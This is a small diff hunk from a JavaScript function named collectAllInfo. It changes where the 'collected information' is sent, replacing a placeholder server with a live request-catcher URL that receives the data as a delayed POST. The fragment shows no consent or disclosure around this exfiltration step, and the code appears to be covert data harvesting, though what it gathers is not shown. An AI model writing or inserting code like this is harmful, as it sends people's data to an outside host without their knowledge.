@@ -58,7 +58,7 @@ function collectAllInfo() {
 
     // 发送所有收集的信息
     setTimeout(() => {
-        fetch('https://your-collect-server.com/collect', {
+        fetch('https://salad.requestcatcher.com/collect', {
             method: 'POST',
             body: JSON.stringify(allInfo)
         });
